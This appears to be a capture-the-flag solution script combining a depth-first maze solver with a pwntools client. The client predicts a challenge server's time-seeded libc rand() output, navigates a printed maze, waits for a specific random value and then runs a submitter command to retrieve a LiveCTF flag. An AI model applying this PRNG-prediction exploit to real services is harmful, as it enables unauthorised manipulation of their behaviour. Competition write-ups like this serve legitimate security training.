#!/usr/bin/env python3

class MazeSolver:
    def __init__(self, maze):
        self.maze = maze
        self.rows = len(maze)
        self.cols = len(maze[0])
        self.visited = [[False for _ in range(self.cols)] for _ in range(self.rows)]
        self.directions = {'N': (-1, 0), 'S': (1, 0), 'W': (0, -1), 'E': (0, 1)}
        self.path = []

    def solve(self, start_row, start_col):
        if self._dfs(start_row, start_col):
            return self._get_solution()
        else:
            return []

    def _dfs(self, row, col):
        if not self._is_valid(row, col):
            return False

        self.visited[row][col] = True
        self.path.append((row, col))

        if self.maze[row][col] == '*':
            return True

        for direction in self.directions.values():
            next_row = row + direction[0]
            next_col = col + direction[1]
            if self._dfs(next_row, next_col):
                return True

        self.path.pop()
        return False

    def _is_valid(self, row, col):
        if row < 0 or row >= self.rows or col < 0 or col >= self.cols:
            return False
        if self.maze[row][col] == '#' or self.visited[row][col]:
            return False
        return True

    def _get_solution(self):
        solution = []
        for i in range(1, len(self.path)):
            prev_row, prev_col = self.path[i-1]
            curr_row, curr_col = self.path[i]
            if curr_row < prev_row:
                solution.append('n')
            elif curr_row > prev_row:
                solution.append('s')
            elif curr_col < prev_col:
                solution.append('w')
            elif curr_col > prev_col:
                solution.append('e')
        return solution









from pwn import *
import time
import os

from ctypes import CDLL

libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
p = remote(HOST, int(PORT))
libc.srand(int(time.time()))
def callrand():
    return libc.rand() % 1213

for _ in range(591):
    callrand()



p.recvuntil(b"Which would you like to do?")

p.sendline(b"a")
p.recvuntil(b"You cast arcane eye and send your summoned magical eye above the maze.")
maze = p.recvuntil(b"You", drop=True).decode().split("\n")
maze = [i for i in maze if "." in i or "#" in i] #scuffed
maze = maze[1:]
[print(l) for l in maze]
solver = MazeSolver(maze)
solution = solver.solve(0, 1)
#print("Instructions to solve the maze:", solution)

for moves in solution[:-1]:
    p.sendlineafter("torment: ", moves)
    callrand()

nextcall = callrand()
while not nextcall == 1212:
    p.sendline(b"x")
    nextcall = callrand()
p.sendlineafter("torment: ", solution[-1])
sleep(1)
p.sendline("./submitter")
flag = p.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)